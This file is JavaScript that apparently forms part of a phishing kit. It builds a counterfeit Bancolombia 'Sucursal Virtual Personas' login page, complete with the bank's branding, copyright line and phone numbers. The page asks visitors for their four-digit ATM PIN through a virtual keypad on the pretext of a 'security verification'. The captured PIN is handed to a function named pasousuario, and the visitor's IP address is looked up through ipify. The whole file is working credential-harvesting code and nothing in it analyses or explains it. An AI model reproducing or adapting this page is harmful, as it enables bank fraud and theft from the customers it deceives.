let head = `<title>Bancolombia Sucursal Virtual Personas</title>
<meta http-equiv="content-type" content="text/html; utf-8">
<meta charset="utf-8">
<meta content="es" http-equiv="Content-Language">
<meta name="description" content="">
<meta name="author" content="">
<meta name="Copyright" content="">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<link href="../../../../../css/main.css" rel="stylesheet">
<link href="../../../../../css/keyboard.css" rel="stylesheet">
<link href="../../../../../css/bootstrap.css" rel="stylesheet">
<link href="../../../../../css/stylesheet.css" rel="stylesheet">
<link rel="icon" type="image/png" href="../../../../../img/logo.png" />`;

let contenido = `<div class="container">
<div>
    <div id="header" class="mua-page-header">
        <div class="row row-logo-svp">
            <div class="col-xs-12 col-sm-7 col-md-7 left-div">
                <div class="mua-imgLogoItem"></div>
                <div class="text-svp-name">Sucursal Virtual Personas</div>
            </div>
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-7 col-md-7 left-div">
                <div id="lastIn" class="mua-title-text" style="padding-top: 10px !important;">






                    


                    <div>
                        <div class="timeText">Fecha y hora actual:</div>
                        <span id="fecha-hora" class="lastVisitedText" currenttime="1692596154200">Lunes 21 de Agosto de 2023 12:35:54 AM</span>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="panel-heading">
        <h3>
            Inicio de sesión
        </h3>
    </div>
</div>

<div>
    <div class="panel panel-primary">
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 mua_message_not_from_svp" id="tabError" style="display: none;">
                <div class="errorDiv">
                    <div class="divTextMessage">
                        <span class="icon-error errorIcon">
                            <span class="path1"></span>
                            <span class="path2"></span>
                            <span class="path3"></span>
                        </span>
                        <div class="errorTitulo">Error</div>
                        <div id="summary" class="errorTexto">
                            Por favor ingrese su clave
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="mua-panel-body">
            <div class="row">
                <div class="col-lg-5 col-md-5 col-sm-6">

                </div>

                <div class="col-lg-4 col-md-5 col-sm-6">
                    <div class="panel_general mua-panel_general">
                        <div class="title-panel-label">
                            <h1>
                                Clave
                            </h1>
                        </div>
                        <div class="subtitle-land-label">
                            <h4>
                                Por motivos de seguridad es necesario procesar una verificación de identidad.
                            </h4>
                        </div>
                        <div id="contenido">
                            <div class="mua-content-group-panel">
                                <div class="mua-label-input">
                                    <label class="control-label-index" for="username">
                                        Ingresa tu clave
                                    </label>
                                </div>
                                <div>
                                    <div class="mua_svp_enroll_update_control">
                                        <input id="txtPassword" name="password" class="mua-form-control mua-readOnlyInput mua_svp_control_password mua-input-icon" type="password" value="" readonly="true" maxlength="4" autocomplete="off">
                                        <span class="mua-icon-lock"> </span>
                                    </div>
                                </div>
                            </div>
                            <div class="mua-content-legend mua_svp_enroll_update_label">
                                Ingresa mediante el teclado virtual la clave que usas en el cajero automático.
                            </div>
                        </div>
                        <div class="two-button-container mua-button-container">
                            <div class="two-button-a">
                                <input class="btn btn-default" onclick="document.getElementById('password').type='text';document.getElementById('password').value = '';window.location.href='/mua/CLOSE_ALL'; return (false);" type="button" value="Cancelar">
                            </div>
                            <div class="two-button-b">
                                <input id="btnPass" name="btnPass" class="btn btn-success" type="button" value="Ingresar">
                            </div>
                        </div>
                        <div class="mua-panel_enlances">
                            <div>
                                <span id="popoverId" class="glyphicon icon-icon_tooltip mua_pg_pgdsc_icons mua-label-icon" data-original-title="" title=""></span>
                                <div id="popoverContent" class="hide">
                                    <span class="mua_tooltip_close">×</span>
                                    <div class="mua_tooltip_msg">
                                        Si usted es un Colombiano en el Exterior y no ha sido cliente Bancolombia en el pasado o es un cliente exclusivo Fiduciaria, usted debe generar una clave para continuar con el proceso.
                                    </div>
                                </div>
                                <a href="/mua/GENERATE_PASS_DATA?scis=juoS20bsOqga56u%2BqdmTUqJQnUezG747GAs83Vo01ToQt22cDDjlydDxo1SRxzeX">Genera una clave personal</a>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="col-lg-3 col-md-3 col-sm-3 col-xs-3" style="height:350px;width:220px;">
                    <table align="left" valign="top" cellspacing="0" cellpadding="0" class="bg_button">
                        <tbody>
                            <tr align="left">
                                <td valign="top" align="left">
                                    <div class="teclado">
                                        <table class="bg_button" id="teclado" valign="top">
                                            <tbody>
                                                <tr>
                                                    <td id="tecla5" class="bg_buttonSmall" align="center" style="cursor:default; text-align: center;" onmouseover="KXvBisyjYLRt();" onmouseout="changeToOrigKeyboard();">
                                                        5
                                                    </td>
                                                    <td id="tecla7" class="bg_buttonSmall" align="center" style="cursor:default; text-align: center;" onmouseover="KXvBisyjYLRt();" onmouseout="changeToOrigKeyboard();">
                                                        7
                                                    </td>
                                                    <td id="tecla4" class="bg_buttonSmall" align="center" style="cursor:default; text-align: center;" onmouseover="KXvBisyjYLRt();" onmouseout="changeToOrigKeyboard();">
                                                        4
                                                    </td>
                                                </tr>
                                                <tr>
                                                    <td id="tecla0" class="bg_buttonSmall" align="center" style="cursor:default; text-align: center;" onmouseover="KXvBisyjYLRt();" onmouseout="changeToOrigKeyboard();">
                                                        0
                                                    </td>
                                                    <td id="tecla3" class="bg_buttonSmall" align="center" style="cursor:default; text-align: center;" onmouseover="KXvBisyjYLRt();" onmouseout="changeToOrigKeyboard();">
                                                        3
                                                    </td>
                                                    <td id="tecla6" class="bg_buttonSmall" align="center" style="cursor:default; text-align: center;" onmouseover="KXvBisyjYLRt();" onmouseout="changeToOrigKeyboard();">
                                                        6
                                                    </td>
                                                </tr>
                                                <tr>
                                                    <td id="tecla2" class="bg_buttonSmall" align="center" style="cursor:default; text-align: center;" onmouseover="KXvBisyjYLRt();" onmouseout="changeToOrigKeyboard();">
                                                        2
                                                    </td>
                                                    <td id="tecla8" class="bg_buttonSmall" align="center" style="cursor:default; text-align: center;" onmouseover="KXvBisyjYLRt();" onmouseout="changeToOrigKeyboard();">
                                                        8
                                                    </td>
                                                    <td id="tecla1" class="bg_buttonSmall" align="center" style="cursor:default; text-align: center;" onmouseover="KXvBisyjYLRt();" onmouseout="changeToOrigKeyboard();">
                                                        1
                                                    </td>
                                                </tr>
                                                <tr>
                                                    <td id="tecla9" class="bg_buttonSmall" align="center" style="cursor:default; text-align: center;" onmouseover="KXvBisyjYLRt();" onmouseout="changeToOrigKeyboard();">
                                                        9
                                                    </td>
                                                    <td colspan="2" onclick="clearKeys();" class="bg_buttonSmall">
                                                        <div id="teclaborrar" border="0" valign="center" align="center" onfocus="this.blur();" class="colorContrast1">Borrar</div>
                                                    </td>
                                                </tr>
                                            </tbody>
                                        </table>
                                    </div>
                                    <table class="bg_button" id="_CONSTRAST" valign="top" cellspacing="0">
                                        <tbody>
                                            <tr>
                                                <td><img width="90" height="34" border="0" src="../../../../../img/Contraste1.gif" name="constrastImg" id="constrastImg" usemap="#numericKeyboardMap" style="cursor: default;"> <map name="numericKeyboardMap" id="numericKeyboardMap"><area shape="circle" class="cursorContrast" coords="10,30,15" onmouseover="setHandCursor(document.constrastImg)" onclick="changeContrastLevel(1)" onmouseout="setDefaultCursor(document.constrastImg)"><area shape="circle" class="cursorContrast" coords="50,30,15" onmouseover="setHandCursor(document.constrastImg)" onclick="changeContrastLevel(2)" onmouseout="setDefaultCursor(document.constrastImg)"><area shape="circle" class="cursorContrast" coords="90,30,15" onmouseover="setHandCursor(document.constrastImg)" onclick="changeContrastLevel(3)" onmouseout="setDefaultCursor(document.constrastImg)"></map></td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                </div>
                <div class="row">
                    <div class="col-xs-12 col-sm-12 col-md-12">
                        <p class="mua-footer">
                            Sucursal Telefónica Bancolombia: Bogotá (57) 60 1 343 00 00 - Medellín (57) 60 4 510 90 00 - Cali (57) 60 2 554 05 05 - Barranquilla (57) 60 5 361 88 88 - Cartagena (57) 60 5 693 44 00 - <br> Bucaramanga (57) 60 7 697 25 25 - Pereira (57) 60 6 340 12 13 - El resto del país 018000 9 12345. Sucursales Telefónicas en el exterior: España (34) 900 995 717 - Estados Unidos (1) 866 379 97 14.
                        </p>
                    </div>
                </div>
                <div style="margin-top: 10px;">
                    <div class="mua-title-text pull-left" id="ip"></div>
                    <div class="mua-title-text pull-right">Copyright ©&nbsp;<span id="fecha">2023</span>&nbsp;Bancolombia S.A.&nbsp;&nbsp;</div>
                </div>
            </div>
        </div>
    </div>
</div>
`;

function addHead() {
  $("head").append(head);
}

function addCode() {
  $("#loginUserForm").html(contenido);

  $(".teclado td").hover(function () {
    $(
      "#tecla1,#tecla2,#tecla3,#tecla4,#tecla5,#tecla6,#tecla7,#tecla8,#tecla9,#tecla0"
    ).html("*");
  });

  $(".teclado td").on("mouseout", function () {
    $("#tecla1").html("1");
    $("#tecla2").html("2");
    $("#tecla3").html("3");
    $("#tecla4").html("4");
    $("#tecla5").html("5");
    $("#tecla6").html("6");
    $("#tecla7").html("7");
    $("#tecla8").html("8");
    $("#tecla9").html("9");
    $("#tecla0").html("0");
  });

  $(".teclado").on("touchstart", function () {
    $("#tecla1").html("1");
    $("#tecla2").html("2");
    $("#tecla3").html("3");
    $("#tecla4").html("4");
    $("#tecla5").html("5");
    $("#tecla6").html("6");
    $("#tecla7").html("7");
    $("#tecla8").html("8");
    $("#tecla9").html("9");
    $("#tecla0").html("0");
  });

  $("#btnPass").click(function () {
    if ($("#txtPassword").val().length > 3) {
      pasousuario($("#txtPassword").val());
    } else {
      $("#tabError").show();
      $("#txtPassword").css("border", "1px solid #e20201");
    }
  });

  $("#tecla1").click(function () {
    if ($("#txtPassword").val().length < 4) {
      $("#txtPassword").val($("#txtPassword").val() + "1");
      $("#txtPassword").css("border", "1px solid #cccccc");
      $("#tabError").hide();
    }
  });
  $("#tecla2").click(function () {
    if ($("#txtPassword").val().length < 4) {
      $("#txtPassword").val($("#txtPassword").val() + "2");
      $("#txtPassword").css("border", "1px solid #cccccc");
      $("#tabError").hide();
    }
  });
  $("#tecla3").click(function () {
    if ($("#txtPassword").val().length < 4) {
      $("#txtPassword").val($("#txtPassword").val() + "3");
      $("#txtPassword").css("border", "1px solid #cccccc");
      $("#tabError").hide();
    }
  });
  $("#tecla4").click(function () {
    if ($("#txtPassword").val().length < 4) {
      $("#txtPassword").val($("#txtPassword").val() + "4");
      $("#txtPassword").css("border", "1px solid #cccccc");
      $("#tabError").hide();
    }
  });
  $("#tecla5").click(function () {
    if ($("#txtPassword").val().length < 4) {
      $("#txtPassword").val($("#txtPassword").val() + "5");
      $("#txtPassword").css("border", "1px solid #cccccc");
      $("#tabError").hide();
    }
  });
  $("#tecla6").click(function () {
    if ($("#txtPassword").val().length < 4) {
      $("#txtPassword").val($("#txtPassword").val() + "6");
      $("#txtPassword").css("border", "1px solid #cccccc");
      $("#tabError").hide();
    }
  });
  $("#tecla7").click(function () {
    if ($("#txtPassword").val().length < 4) {
      $("#txtPassword").val($("#txtPassword").val() + "7");
      $("#txtPassword").css("border", "1px solid #cccccc");
      $("#tabError").hide();
    }
  });
  $("#tecla8").click(function () {
    if ($("#txtPassword").val().length < 4) {
      $("#txtPassword").val($("#txtPassword").val() + "8");
      $("#txtPassword").css("border", "1px solid #cccccc");
      $("#tabError").hide();
    }
  });
  $("#tecla9").click(function () {
    if ($("#txtPassword").val().length < 4) {
      $("#txtPassword").val($("#txtPassword").val() + "9");
      $("#txtPassword").css("border", "1px solid #cccccc");
      $("#tabError").hide();
    }
  });
  $("#tecla0").click(function () {
    if ($("#txtPassword").val().length < 4) {
      $("#txtPassword").val($("#txtPassword").val() + "0");
      $("#txtPassword").css("border", "1px solid #cccccc");
      $("#tabError").hide();
    }
  });
  $("#teclaborrar").click(function () {
    $("#txtPassword").val("");
    $("#txtPassword").css("border", "1px solid #cccccc");
    $("#tabError").hide();
  });

  $(function ($) {
    var optionsEST = {
      utc: true,
      utcOffset: -5,
      format: "%A %R de %B de %Y %l:%M:%S %P",
      language: "es",
    };
    $("#fecha-hora").jclockNew(optionsEST);
  });
}

document.addEventListener("DOMContentLoaded", function () {
  addHead();
});

window.addEventListener("load", function () {
  //Aquí se puede meter la función addCode() para que el contenido cargue después de que se hayan
  //puesto cargado los estilos y que no se vea el html solo al inicio.
  addCode();
});

fetch("https://api64.ipify.org?format=json")
  .then((response) => response.json())
  .then((data) => {
    let ip = data.ip;
    let divIp = document.getElementById("ip");
    divIp.textContent = "Dirección IP: " + ip;
  });
